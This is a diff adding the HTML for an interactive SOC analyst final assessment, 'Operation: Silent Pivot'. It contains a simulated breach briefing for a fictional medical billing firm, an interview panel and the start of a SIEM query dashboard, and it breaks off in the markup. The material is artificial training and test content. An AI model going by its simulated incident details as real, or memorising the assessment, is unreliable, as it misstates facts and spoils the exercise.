@@ -1,0 +1,2402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Operation: Silent Pivot — SOC Analyst Final Project</title>
+<style>
+  :root {
+    --accent:    #00d4ff;
+    --accent2:   #7c3aed;
+    --green:     #00ff88;
+    --red:       #ff4757;
+    --yellow:    #ffd32a;
+    --orange:    #ff6b35;
+    --bg:        #0a0e17;
+    --bg2:       #111827;
+    --bg3:       #1a2234;
+    --border:    #1e2d45;
+    --border2:   #2a3f5f;
+    --text:      #cdd9f0;
+    --text-dim:  #9babc8;
+    --text-bright: #eef2ff;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--text); min-height: 100vh; }
+
+  /* NAV */
+  #nav { display: flex; background: var(--bg2); border-bottom: 1px solid var(--border); padding: 0; overflow-x: auto; box-shadow: 0 2px 20px rgba(0,212,255,0.08); }
+  .nav-btn { padding: 12px 18px; background: none; border: none; color: var(--text-dim); cursor: pointer; font-family: inherit; font-size: 13px; white-space: nowrap; border-bottom: 2px solid transparent; transition: all 0.2s; }
+  .nav-btn:hover { color: var(--text-bright); background: rgba(0,212,255,0.06); }
+  .nav-btn.active { color: var(--accent); border-bottom-color: var(--accent); text-shadow: 0 0 12px rgba(0,212,255,0.6); }
+  .nav-btn.locked { color: #2a3f5f; cursor: not-allowed; }
+  .nav-btn .phase-num { display: inline-block; width: 20px; height: 20px; border-radius: 50%; background: var(--border); font-size: 11px; line-height: 20px; text-align: center; margin-right: 6px; }
+  .nav-btn.active .phase-num { background: var(--accent); color: var(--bg); box-shadow: 0 0 8px rgba(0,212,255,0.8); }
+  .nav-btn.completed .phase-num { background: var(--green); color: var(--bg); box-shadow: 0 0 8px rgba(0,255,136,0.6); }
+  .nav-btn.completed { color: var(--green); }
+
+  /* PAGES */
+  .page { display: none; padding: 30px; max-width: 1000px; margin: 0 auto; }
+  .page.active { display: block; }
+
+  /* CARDS */
+  .card { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 24px; margin-bottom: 20px; box-shadow: 0 1px 12px rgba(0,0,0,0.4); }
+  .card h2 { color: var(--text-bright); font-size: 18px; margin-bottom: 12px; }
+  .card h3 { color: var(--accent); font-size: 15px; margin-bottom: 10px; }
+  .card p, .card li { color: var(--text); line-height: 1.7; font-size: 14px; }
+  .card ul, .card ol { padding-left: 20px; margin-top: 8px; }
+  .card li { margin-bottom: 4px; }
+
+  /* ALERTS */
+  .alert { border-radius: 6px; padding: 12px 16px; margin-bottom: 16px; font-size: 13px; }
+  .alert-red    { background: rgba(255,71,87,0.1);  border: 1px solid var(--red);    color: #ff6b7a; }
+  .alert-yellow { background: rgba(255,211,42,0.08); border: 1px solid var(--yellow); color: var(--yellow); }
+  .alert-green  { background: rgba(0,255,136,0.08);  border: 1px solid var(--green);  color: var(--green); }
+  .alert-blue   { background: rgba(0,212,255,0.08);  border: 1px solid var(--accent); color: var(--accent); }
+
+  /* BUTTONS */
+  .btn { padding: 8px 16px; border-radius: 6px; border: none; cursor: pointer; font-family: inherit; font-size: 13px; transition: all 0.18s; }
+  .btn-primary { background: linear-gradient(135deg, #00c853, #00e676); color: #000; font-weight: bold; box-shadow: 0 0 12px rgba(0,230,118,0.35); }
+  .btn-primary:hover { background: linear-gradient(135deg, #00e676, #69ff8a); box-shadow: 0 0 18px rgba(0,230,118,0.55); transform: translateY(-1px); }
+  .btn-blue { background: linear-gradient(135deg, #0070f3, #00b4ff); color: #fff; font-weight: bold; box-shadow: 0 0 10px rgba(0,180,255,0.3); }
+  .btn-blue:hover { background: linear-gradient(135deg, #0090ff, #00d4ff); box-shadow: 0 0 16px rgba(0,212,255,0.5); transform: translateY(-1px); }
+  .btn-gray { background: var(--bg3); color: var(--text); border: 1px solid var(--border2); }
+  .btn-gray:hover { background: var(--border2); border-color: var(--accent); color: var(--text-bright); }
+  .btn-red { background: linear-gradient(135deg, #c0392b, var(--red)); color: #fff; }
+
+  /* TERMINAL */
+  #terminal-output { background: #020810; border: 1px solid var(--border2); border-radius: 6px 6px 0 0; padding: 16px 16px 8px; min-height: 300px; max-height: 480px; overflow-y: auto; font-size: 13px; line-height: 1.6; box-shadow: inset 0 0 40px rgba(0,0,0,0.6); }
+  .term-line { margin-bottom: 2px; }
+  .term-prompt { color: var(--green); text-shadow: 0 0 8px rgba(0,255,136,0.5); }
+  .term-cmd { color: var(--text-bright); }
+  .term-output { color: #8fa8c8; white-space: pre-wrap; }
+  .term-error { color: var(--red); }
+  #terminal-input-row { display: flex; align-items: center; gap: 0; background: #020810; border: 1px solid var(--border2); border-top: none; border-radius: 0 0 6px 6px; padding: 4px 16px 10px; margin-bottom: 12px; }
+  #terminal-prompt-label { color: var(--green); font-size: 13px; white-space: nowrap; padding-right: 6px; text-shadow: 0 0 8px rgba(0,255,136,0.5); }
+  #terminal-input { background: transparent; border: none; color: var(--text-bright); font-family: 'Courier New', monospace; font-size: 13px; flex: 1; outline: none; caret-color: var(--green); }
+  #terminal-input:focus { border: none; outline: none; }
+
+  /* SIEM */
+  #siem-input { width: 100%; background: #020810; border: 1px solid var(--border2); border-radius: 6px; color: var(--text-bright); font-family: inherit; font-size: 13px; padding: 10px; min-height: 80px; outline: none; resize: vertical; }
+  #siem-input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(0,212,255,0.15); }
+  #siem-results { background: #020810; border: 1px solid var(--border2); border-radius: 6px; padding: 12px; min-height: 60px; font-size: 12px; overflow-x: auto; margin-top: 12px; }
+  .siem-table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  .siem-table th { background: var(--bg3); color: var(--accent); padding: 6px 10px; text-align: left; border-bottom: 1px solid var(--border2); letter-spacing: 0.5px; }
+  .siem-table td { padding: 5px 10px; border-bottom: 1px solid var(--border); color: var(--text); }
+  .siem-table tr:hover td { background: var(--bg3); }
+  .siem-error { color: var(--red); font-size: 13px; }
+
+  /* JORDAN */
+  #jordan-chat { background: #020810; border: 1px solid var(--border2); border-radius: 6px; padding: 16px; min-height: 200px; max-height: 420px; overflow-y: auto; margin-bottom: 12px; }
+  .msg { margin-bottom: 14px; }
+  .msg-jordan { }
+  .msg-jordan .speaker { color: var(--yellow); font-size: 12px; margin-bottom: 4px; }
+  .msg-jordan .bubble { background: var(--bg3); border: 1px solid var(--border2); border-radius: 6px; padding: 10px 14px; font-size: 13px; color: var(--text); line-height: 1.6; display: inline-block; max-width: 85%; }
+  .msg-student .speaker { color: var(--accent); font-size: 12px; margin-bottom: 4px; text-align: right; }
+  .msg-student .bubble { background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.25); border-radius: 6px; padding: 10px 14px; font-size: 13px; color: var(--text-bright); line-height: 1.6; display: inline-block; max-width: 85%; float: right; }
+  .msg-student { overflow: hidden; }
+  #jordan-input-row { display: flex; gap: 8px; }
+  #jordan-input { flex: 1; background: #020810; border: 1px solid var(--border2); border-radius: 6px; color: var(--text-bright); font-family: inherit; font-size: 13px; padding: 8px 12px; outline: none; }
+  #jordan-input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(0,212,255,0.15); }
+  .hint-box { background: rgba(255,211,42,0.08); border: 1px solid var(--yellow); border-radius: 6px; padding: 10px 14px; font-size: 13px; color: var(--yellow); margin-top: 10px; display: none; }
+
+  /* REPORT / PLAYBOOK */
+  .report-section { margin-bottom: 28px; }
+  .report-section h3 { color: var(--accent); font-size: 14px; margin-bottom: 10px; border-bottom: 1px solid var(--border2); padding-bottom: 6px; }
+  textarea.report-field { width: 100%; background: #020810; border: 1px solid var(--border2); border-radius: 6px; color: var(--text); font-family: inherit; font-size: 13px; padding: 10px; outline: none; resize: vertical; min-height: 80px; line-height: 1.6; }
+  textarea.report-field:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(0,212,255,0.12); }
+  input.report-field { width: 100%; background: #020810; border: 1px solid var(--border2); border-radius: 6px; color: var(--text); font-family: inherit; font-size: 13px; padding: 8px 10px; outline: none; }
+  input.report-field:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(0,212,255,0.12); }
+  .field-label { font-size: 12px; color: var(--text-dim); margin-bottom: 4px; margin-top: 12px; }
+  select.report-field { width: 100%; background: #020810; border: 1px solid var(--border2); border-radius: 6px; color: var(--text); font-family: inherit; font-size: 13px; padding: 8px 10px; outline: none; }
+
+  /* PROGRESS */
+  .progress-bar-wrap { background: var(--bg3); border-radius: 99px; height: 8px; margin: 8px 0; }
+  .progress-bar { background: linear-gradient(90deg, var(--accent), var(--green)); height: 8px; border-radius: 99px; transition: width 0.4s; box-shadow: 0 0 8px rgba(0,212,255,0.5); }
+
+  /* BADGES */
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 99px; font-size: 11px; font-weight: bold; margin-right: 4px; }
+  .badge-red    { background: rgba(255,71,87,0.15);  color: #ff6b7a; border: 1px solid var(--red); }
+  .badge-yellow { background: rgba(255,211,42,0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+  .badge-green  { background: rgba(0,255,136,0.1);   color: var(--green);  border: 1px solid var(--green); }
+  .badge-blue   { background: rgba(0,212,255,0.1);   color: var(--accent); border: 1px solid var(--accent); }
+
+  /* MISC */
+  .divider { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
+  .mono { font-family: 'Courier New', monospace; color: var(--accent); }
+  code { background: var(--bg3); padding: 2px 6px; border-radius: 4px; font-size: 12px; color: var(--accent); border: 1px solid var(--border2); }
+  .findings-tracker { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
+  .finding-item { background: var(--bg3); border-radius: 6px; padding: 10px 12px; font-size: 12px; border-left: 3px solid var(--border2); transition: border-color 0.3s; }
+  .finding-item.found { border-left-color: var(--green); box-shadow: -2px 0 8px rgba(0,255,136,0.2); }
+  .finding-item .fi-label { color: var(--text-dim); }
+  .finding-item.found .fi-label { color: var(--green); }
+
+  /* SIEM DASHBOARD */
+  .siem-alert-item { display:flex; gap:10px; align-items:flex-start; padding:8px 10px; border-radius:6px; background:var(--bg3); border-left:3px solid var(--border2); font-size:12px; cursor:pointer; transition:all 0.15s; }
+  .siem-alert-item:hover { background: #1e2d45; }
+  .siem-alert-item.sev-critical { border-left-color:var(--red); box-shadow:-2px 0 8px rgba(255,71,87,0.25); }
+  .siem-alert-item.sev-high     { border-left-color:var(--orange); box-shadow:-2px 0 6px rgba(255,107,53,0.2); }
+  .siem-alert-item.sev-medium   { border-left-color:var(--accent); box-shadow:-2px 0 6px rgba(0,212,255,0.15); }
+  .siem-alert-item.sev-low      { border-left-color:var(--green); }
+  .siem-alert-ts { color:var(--text-dim); white-space:nowrap; font-size:11px; margin-top:1px; min-width:80px; }
+  .siem-alert-body { flex:1; }
+  .siem-alert-type { color:var(--text-bright); font-weight:bold; margin-bottom:2px; }
+  .siem-alert-desc { color:var(--text-dim); font-size:11px; line-height:1.5; }
+  .siem-alert-expand { display:none; margin-top:6px; background:#020810; border-radius:4px; padding:8px; font-size:11px; color:var(--text); line-height:1.7; border:1px solid var(--border); }
+  .siem-alert-item.expanded .siem-alert-expand { display:block; }
+  .siem-saved-search { background:var(--bg3); border:1px solid var(--border2); border-radius:5px; color:var(--accent); font-family:'Courier New',monospace; font-size:11px; padding:7px 10px; text-align:left; cursor:pointer; transition:all 0.15s; }
+  .siem-saved-search:hover { background:var(--border2); border-color:var(--accent); color:var(--text-bright); box-shadow: 0 0 8px rgba(0,212,255,0.2); }
+
+  /* RUBRIC */
+  .rubric-row { display:flex; align-items:flex-start; gap:12px; padding:10px 0; border-bottom:1px solid var(--border); font-size:13px; }
+  .rubric-row:last-child { border-bottom:none; }
+  .rubric-pts { min-width:52px; text-align:right; font-weight:bold; }
+  .rubric-pass    { color: var(--green); text-shadow: 0 0 6px rgba(0,255,136,0.4); }
+  .rubric-fail    { color: var(--red); }
+  .rubric-partial { color: var(--yellow); }
+  .rubric-label { flex:1; color:var(--text); }
+  .rubric-note { color:var(--text-dim); font-size:12px; margin-top:2px; }
+  .score-total { font-size:28px; font-weight:bold; color:var(--accent); text-shadow: 0 0 16px rgba(0,212,255,0.5); }
+  .score-denom { font-size:16px; color:var(--text-dim); }
+  #instructor-gate { }
+  #pdf-cover { display:none; }
+  @media print {
+    #nav { display: none; }
+    #pdf-cover { display:block; page-break-after: always; text-align:center; padding: 80px 40px; font-family: Georgia, serif; }
+    #pdf-cover .cover-top { font-size:11px; color:#888; letter-spacing:2px; text-transform:uppercase; margin-bottom:60px; }
+    #pdf-cover .cover-title { font-size:32px; font-weight:bold; color:#1a1a2e; margin-bottom:8px; }
+    #pdf-cover .cover-subtitle { font-size:16px; color:#555; margin-bottom:60px; }
+    #pdf-cover .cover-meta { border-top:2px solid #1a1a2e; border-bottom:1px solid #ccc; padding:24px 0; margin:0 auto; max-width:400px; }
+    #pdf-cover .cover-meta-row { display:flex; justify-content:space-between; padding:6px 0; font-size:13px; }
+    #pdf-cover .cover-meta-row .label { color:#888; }
+    #pdf-cover .cover-meta-row .value { color:#1a1a2e; font-weight:bold; }
+    #pdf-cover .cover-footer { margin-top:60px; font-size:11px; color:#aaa; }
+    .page { display: block !important; }
+    #page0, #page1, #page2, #page3, #page4, #page5, #page7, #page8, #page9 { display: none !important; }
+    #page6 { display: block !important; }
+    .no-print { display: none !important; }
+    textarea.report-field { border:1px solid #ccc; background:#fff; color:#000; font-family: Georgia, serif; font-size:12px; height:auto; min-height:0; overflow:visible; resize:none; }
+    input.report-field, select.report-field { border:none; border-bottom:1px solid #ccc; background:#fff; color:#000; font-size:13px; }
+    body { background:#fff; color:#000; }
+    .card { background:#fff; border:none; border-bottom:1px solid #eee; border-radius:0; padding:16px 0; margin-bottom:0; }
+    .card h2 { color:#1a1a2e; font-family: Georgia, serif; }
+    .card h3, .report-section h3 { color:#1a1a2e; border-bottom:2px solid #1a1a2e; font-size:13px; letter-spacing:1px; text-transform:uppercase; }
+    .card p, .card li { color:#333; }
+    .field-label { color:#888; font-size:11px; text-transform:uppercase; letter-spacing:0.5px; }
+    .alert-red { background:#fee; border-color:#c00; color:#c00; }
+    .alert-blue { display:none; }
+    .report-section { page-break-inside: avoid; }
+    code { background:#f4f4f4; color:#333; }
+  }
+</style>
+</head>
+<body>
+
+<div id="pdf-cover">
+  <div class="cover-top">Incident Analysis Report</div>
+  <div class="cover-title">Operation: Silent Pivot</div>
+  <div class="cover-subtitle">ClearPath Medical Billing, LLC — May 18, 2026</div>
+  <div class="cover-meta">
+    <div class="cover-meta-row"><span class="label">Prepared by</span><span class="value" id="cv-analyst"></span></div>
+    <div class="cover-meta-row"><span class="label">Date of Report</span><span class="value" id="cv-date"></span></div>
+    <div class="cover-meta-row"><span class="label">Client</span><span class="value" id="cv-client"></span></div>
+    <div class="cover-meta-row"><span class="label">Classification</span><span class="value" id="cv-class"></span></div>
+  </div>
+  <div class="cover-footer">This report was prepared as part of a cybersecurity analyst assessment. Contains simulated incident data.</div>
+</div>
+
+<div id="nav">
+  <button class="nav-btn active" onclick="goTo(0)" id="nb0"><span class="phase-num">0</span>Briefing</button>
+  <button class="nav-btn" onclick="goTo(1)" id="nb1"><span class="phase-num">1</span>Interview</button>
+  <button class="nav-btn" onclick="goTo(2)" id="nb2"><span class="phase-num">2</span>SIEM</button>
+  <button class="nav-btn" onclick="goTo(3)" id="nb3"><span class="phase-num">3</span>Terminal</button>
+  <button class="nav-btn" onclick="goTo(4)" id="nb4"><span class="phase-num">4</span>Python Task</button>
+  <button class="nav-btn" onclick="goTo(5)" id="nb5"><span class="phase-num">5</span>Playbook</button>
+  <button class="nav-btn" onclick="goTo(6)" id="nb6"><span class="phase-num">6</span>Final Report</button>
+  <button class="nav-btn" onclick="goTo(7)" id="nb7"><span class="phase-num">7</span>Notebook</button>
+  <button class="nav-btn" onclick="goTo(8)" id="nb8"><span class="phase-num">?</span>Resources</button>
+  <button class="nav-btn" onclick="goTo(9)" id="nb9" style="margin-left:auto;"><span class="phase-num">R</span>Rubric</button>
+</div>
+<div style="background:#161b22; border-bottom:1px solid #30363d; padding:8px 16px; display:flex; align-items:center; gap:12px;" class="no-print">
+  <span id="autosave-status" style="color:#a8b8d0; font-size:12px; flex:1;">Autosave active</span>
+  <button class="btn btn-gray" style="font-size:12px;" onclick="autoSave()">Save Now</button>
+  <button class="btn btn-gray" style="font-size:12px;" onclick="saveMyWork()">Export .html</button>
+  <button class="btn btn-gray" style="font-size:12px; color:#ff7b72;" onclick="clearSave()">Clear Progress</button>
+</div>
+
+<!-- ===================== PAGE 0: BRIEFING ===================== -->
+<div class="page active" id="page0">
+  <div class="card" style="border-color:#da3633;">
+    <div class="alert alert-red" style="margin-bottom:16px;">CONFIDENTIAL — FOR AUTHORIZED ANALYSTS ONLY</div>
+    <h2 style="color:#ff7b72; font-size:22px;">Operation: Silent Pivot</h2>
+    <p style="color:#a8b8d0; margin-top:6px; font-size:13px;">SOC Analyst Final Assessment &mdash; Estimated time: 5&ndash;7 hours</p>
+  </div>
+
+  <div class="card">
+    <h2>Scenario Briefing</h2>
+    <p>You have been contracted as a junior SOC analyst for <strong style="color:#f0f6fc;">ClearPath Medical Billing, LLC</strong> &mdash; a small healthcare-adjacent company that processes billing records for several regional clinics. They handle <strong style="color:#f0f6fc;">Protected Health Information (PHI)</strong> and are subject to HIPAA compliance requirements.</p>
+    <br>
+    <p>At 2:14 AM on the night of <strong style="color:#f0f6fc;">May 18, 2026</strong>, the company's monitoring system triggered an unusual alert. Their IT Manager, Jordan Reyes, noticed anomalies in the server logs the following morning and has called your firm in to investigate.</p>
+    <br>
+    <p>Jordan believes the company may have been breached, but does not know the scope, the method of entry, or whether any data was exfiltrated. Your job is to find out.</p>
+  </div>
+
+  <div class="card">
+    <h2>Your Mission</h2>
+    <ol>
+      <li><strong style="color:#f0f6fc;">Phase 1 — Interview:</strong> Talk to Jordan Reyes to understand the company's security posture, controls, and what they were doing (or not doing) before the incident.</li>
+      <li><strong style="color:#f0f6fc;">Phase 2 — SIEM Analysis:</strong> Query the company's alert database to identify suspicious events and build a timeline.</li>
+      <li><strong style="color:#f0f6fc;">Phase 3 — Terminal Investigation:</strong> Examine the compromised Linux server for artifacts left behind by the attacker.</li>
+      <li><strong style="color:#f0f6fc;">Phase 4 — Python Task:</strong> Write a Python script to automate detection of the brute force pattern in the raw log file.</li>
+      <li><strong style="color:#f0f6fc;">Phase 5 — Playbook:</strong> Document your incident response steps using the NIST CSF framework.</li>
+      <li><strong style="color:#f0f6fc;">Phase 6 — Final Report:</strong> Produce a professional analyst report with findings, control gaps, and recommendations.</li>
+    </ol>
+  </div>
+
+  <div class="card">
+    <h2>Company Profile: ClearPath Medical Billing, LLC</h2>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:8px;">
+      <div>
+        <p class="field-label">Industry</p>
+        <p>Healthcare billing / medical administration</p>
+        <p class="field-label" style="margin-top:10px;">Size</p>
+        <p>14 employees, 1 IT staff (Jordan)</p>
+        <p class="field-label" style="margin-top:10px;">Data handled</p>
+        <p>PHI, patient records, insurance billing data</p>
+      </div>
+      <div>
+        <p class="field-label">Claimed framework</p>
+        <p>NIST Cybersecurity Framework (CSF)</p>
+        <p class="field-label" style="margin-top:10px;">Regulatory obligations</p>
+        <p>HIPAA, state breach notification laws</p>
+        <p class="field-label" style="margin-top:10px;">Infrastructure</p>
+        <p>1 Linux server (Ubuntu 22.04), 1 Windows workstation server, cloud email</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Deliverable</h2>
+    <p>At the end of this project, you will submit your completed <strong style="color:#f0f6fc;">Final Report (Phase 6)</strong> as a PDF. This report is your portfolio artifact and should demonstrate:</p>
+    <ul style="margin-top:10px;">
+      <li>Your ability to analyze security event data</li>
+      <li>Technical investigation skills (log analysis, system forensics)</li>
+      <li>Understanding of security frameworks and controls</li>
+      <li>Professional written communication</li>
+      <li>Ethical reasoning in a real-world scenario</li>
+    </ul>
+  </div>
+
+  <div class="card" style="border-color:#d29922; background:#1c1a0f;">
+    <div style="display:flex; align-items:center; gap:14px; flex-wrap:wrap;">
+      <div style="flex:1;">
+        <p style="color:#e3b341; font-size:13px; font-weight:bold; margin-bottom:4px;">Saving Your Work</p>
+        <p style="color:#a8b8d0; font-size:13px;">This project will take several sessions to complete. Your progress saves automatically in this browser, but <strong style="color:#f0f6fc;">if you switch devices or browsers you will lose it.</strong> Use the <strong style="color:#f0f6fc;">Export .html</strong> button in the toolbar at the end of every session to take your work with you.</p>
+      </div>
+      <button class="btn btn-gray" style="font-size:12px; white-space:nowrap;" onclick="saveMyWork()">Export .html now</button>
+    </div>
+  </div>
+  <div style="text-align:center; margin-top:10px;">
+    <button class="btn btn-primary" style="font-size:15px; padding:12px 32px;" onclick="goTo(1)">Begin Investigation &rarr;</button>
+  </div>
+</div>
+
+<!-- ===================== PAGE 1: JORDAN INTERVIEW ===================== -->
+<div class="page" id="page1">
+  <div class="card">
+    <h2>Phase 1 — Stakeholder Interview</h2>
+    <p>You are sitting across from <strong style="color:#f0f6fc;">Jordan Reyes</strong>, IT Manager at ClearPath Medical Billing. Jordan is cooperative but visibly stressed. Ask questions to understand the company's security posture before you begin your technical investigation.</p>
+    <br>
+    <p style="color:#a8b8d0; font-size:13px;">Type your questions naturally. Jordan will respond based on what you ask. Try to uncover information about passwords, backups, MFA, logging, frameworks, the database, network setup, and more. You need this context for your final report.</p>
+  </div>
+
+  <div class="card" style="padding:16px;">
+    <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+      <div style="width:48px; height:48px; border-radius:50%; background:#2d3748; border:2px solid #e3b341; display:flex; align-items:center; justify-content:center; font-size:20px; flex-shrink:0;">J</div>
+      <div>
+        <div style="color:#f0f6fc; font-size:14px; font-weight:bold;">Jordan Reyes</div>
+        <div style="color:#a8b8d0; font-size:12px;">IT Manager, ClearPath Medical Billing</div>
+      </div>
+      <div style="margin-left:auto;"><span class="badge badge-yellow">Interview in progress</span></div>
+    </div>
+    <div id="jordan-chat"></div>
+    <div id="jordan-input-row">
+      <input type="text" id="jordan-input" placeholder="Type your question and press Enter..." onkeydown="if(event.key==='Enter') askJordan()">
+      <button class="btn btn-blue" onclick="askJordan()">Ask</button>
+    </div>
+  </div>
+
+  <!-- Debrief — hidden until student proceeds -->
+  <div class="card" id="jordan-debrief" style="display:none; border-color:#d29922;">
+    <h3 style="color:#e3b341;">Interview Debrief</h3>
+    <p style="font-size:13px; margin-bottom:12px;">Here's a summary of what you uncovered. Topics you missed are listed with vague labels — you can return to the interview and ask about them before submitting your report.</p>
+    <div class="findings-tracker" id="jordan-tracker">
+      <div class="finding-item" id="jt-mfa"><span class="fi-label">Authentication / MFA</span></div>
+      <div class="finding-item" id="jt-passwords"><span class="fi-label">Password policy</span></div>
+      <div class="finding-item" id="jt-logging"><span class="fi-label">Logging &amp; retention</span></div>
+      <div class="finding-item" id="jt-backup"><span class="fi-label">Backups</span></div>
+      <div class="finding-item" id="jt-framework"><span class="fi-label">Security framework</span></div>
+      <div class="finding-item" id="jt-incident"><span class="fi-label">Incident response plan</span></div>
+      <div class="finding-item" id="jt-database"><span class="fi-label">Database &amp; data access</span></div>
+      <div class="finding-item" id="jt-network"><span class="fi-label">Network / firewall</span></div>
+      <div class="finding-item" id="jt-training"><span class="fi-label">Security training</span></div>
+      <div class="finding-item" id="jt-vendor"><span class="fi-label">Third-party / vendors</span></div>
+    </div>
+    <p id="jordan-debrief-score" style="margin-top:14px; font-size:13px; color:#a8b8d0;"></p>
+  </div>
+
+  <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px; flex-wrap:wrap; gap:8px;">
+    <button class="btn btn-gray" onclick="goTo(0)">&larr; Back</button>
+    <span style="color:#a8b8d0; font-size:12px;">Switching devices? <button class="btn btn-gray" style="font-size:11px; padding:4px 10px;" onclick="saveMyWork()">Export .html</button></span>
+    <button class="btn btn-primary" onclick="showJordanDebriefAndProceed()">Proceed to SIEM &rarr;</button>
+  </div>
+</div>
+
+<!-- ===================== PAGE 2: SIEM ===================== -->
+<div class="page" id="page2">
+
+  <!-- SIEM top bar -->
+  <div style="background:#0d1117; border:1px solid #30363d; border-radius:8px; padding:14px 20px; margin-bottom:16px; display:flex; align-items:center; gap:16px; flex-wrap:wrap;">
+    <div>
+      <div style="color:#58a6ff; font-size:11px; letter-spacing:1px; text-transform:uppercase; margin-bottom:2px;">ClearPath SIEM</div>
+      <div style="color:#f0f6fc; font-size:15px; font-weight:bold;">Incident Dashboard</div>
+    </div>
+    <div style="margin-left:auto; display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
+      <div style="text-align:center; background:#3d1a1a; border:1px solid #da3633; border-radius:6px; padding:6px 14px;">
+        <div style="color:#ff7b72; font-size:18px; font-weight:bold;" id="siem-count-critical">—</div>
+        <div style="color:#ff7b72; font-size:10px; text-transform:uppercase; letter-spacing:1px;">Critical</div>
+      </div>
+      <div style="text-align:center; background:#2d2a1b; border:1px solid #d29922; border-radius:6px; padding:6px 14px;">
+        <div style="color:#e3b341; font-size:18px; font-weight:bold;" id="siem-count-high">—</div>
+        <div style="color:#e3b341; font-size:10px; text-transform:uppercase; letter-spacing:1px;">High</div>
+      </div>
+      <div style="text-align:center; background:#1b2333; border:1px solid #388bfd; border-radius:6px; padding:6px 14px;">
+        <div style="color:#79c0ff; font-size:18px; font-weight:bold;" id="siem-count-medium">—</div>
+        <div style="color:#79c0ff; font-size:10px; text-transform:uppercase; letter-spacing:1px;">Medium</div>
+      </div>
+      <div style="text-align:center; background:#1b2d1e; border:1px solid #3fb950; border-radius:6px; padding:6px 14px;">
+        <div style="color:#56d364; font-size:18px; font-weight:bold;" id="siem-count-low">—</div>
+        <div style="color:#56d364; font-size:10px; text-transform:uppercase; letter-spacing:1px;">Low</div>
+      </div>
+      <div style="text-align:center; background:#21262d; border:1px solid #30363d; border-radius:6px; padding:6px 14px;">
+        <div style="color:#c9d1d9; font-size:11px;">Time Range</div>
+        <div style="color:#f0f6fc; font-size:12px; font-weight:bold;">May 17–18, 2026</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Two-column layout -->
+  <div style="display:grid; grid-template-columns:1fr 2fr; gap:16px; align-items:start;">
+
+    <!-- LEFT: Sidebar -->
+    <div>
+      <!-- Saved searches -->
+      <div class="card" style="padding:16px; margin-bottom:16px;">
+        <h3 style="margin-bottom:12px;">Saved Searches</h3>
+        <p style="color:#a8b8d0; font-size:12px; margin-bottom:10px;">Click to load into editor. You still need to run it.</p>
+        <div style="display:flex; flex-direction:column; gap:6px;">
+          <button class="siem-saved-search" onclick="loadSearch('SELECT * FROM events ORDER BY timestamp ASC;')">All events by time</button>
+          <button class="siem-saved-search" onclick="loadSearch('SELECT event_type, COUNT(*) as count\nFROM events\nGROUP BY event_type\nORDER BY count DESC;')">Event type summary</button>
+          <button class="siem-saved-search" onclick="loadSearch('SELECT source_ip, COUNT(*) as attempts\nFROM events\nWHERE event_type = \'AUTH_FAILURE\'\nGROUP BY source_ip\nORDER BY attempts DESC;')">Failed logins by IP</button>
+          <button class="siem-saved-search" onclick="loadSearch('SELECT * FROM events\nWHERE severity IN (\'critical\',\'high\')\nORDER BY timestamp ASC;')">Critical & high alerts</button>
+          <button class="siem-saved-search" onclick="loadSearch('SELECT * FROM user_accounts\nORDER BY created_at DESC;')">User accounts</button>
+          <button class="siem-saved-search" onclick="loadSearch('SELECT * FROM db_query_log\nORDER BY timestamp ASC;')">Database query log</button>
+        </div>
+      </div>
+
+      <!-- Schema reference -->
+      <div class="card" style="padding:16px;">
+        <h3 style="margin-bottom:12px;">Schema Reference</h3>
+        <div style="margin-bottom:12px;">
+          <p style="color:#79c0ff; font-size:12px; font-weight:bold; margin-bottom:4px;">events</p>
+          <div style="font-size:11px; color:#a8b8d0; line-height:1.9;">
+            id, timestamp, event_type<br>source_ip, username<br>description, severity
+          </div>
+        </div>
+        <div style="margin-bottom:12px;">
+          <p style="color:#79c0ff; font-size:12px; font-weight:bold; margin-bottom:4px;">db_query_log</p>
+          <div style="font-size:11px; color:#a8b8d0; line-height:1.9;">
+            id, timestamp, username<br>query_text, rows_returned<br>flagged
+          </div>
+        </div>
+        <div>
+          <p style="color:#79c0ff; font-size:12px; font-weight:bold; margin-bottom:4px;">user_accounts</p>
+          <div style="font-size:11px; color:#a8b8d0; line-height:1.9;">
+            username, created_at<br>last_login, is_admin<br>account_status
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT: Main panel -->
+    <div>
+      <!-- Alert feed -->
+      <div class="card" style="padding:16px; margin-bottom:16px;">
+        <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px;">
+          <h3 style="margin-bottom:0;">Live Alert Feed</h3>
+          <span style="font-size:11px; color:#a8b8d0;">Most recent 10 alerts — use Query Editor for full data</span>
+        </div>
+        <div id="siem-alert-feed" style="display:flex; flex-direction:column; gap:6px; max-height:340px; overflow-y:auto;"></div>
+      </div>
+
+      <!-- Query editor -->
+      <div style="background:#161b22; border:1px solid #30363d; border-radius:8px; overflow:hidden; margin-bottom:16px;">
+        <div style="background:#1c2128; padding:10px 16px; display:flex; align-items:center; gap:10px; border-bottom:1px solid #30363d;">
+          <span style="color:#58a6ff; font-size:12px; font-weight:bold; letter-spacing:0.5px;">QUERY EDITOR</span>
+          <span style="color:#a8b8d0; font-size:11px;">MySQL syntax supported &mdash; read-only</span>
+          <div style="margin-left:auto; display:flex; gap:8px;">
+            <button class="btn btn-blue" style="font-size:12px; padding:5px 14px;" onclick="runSiemQuery()">&#9654; Run</button>
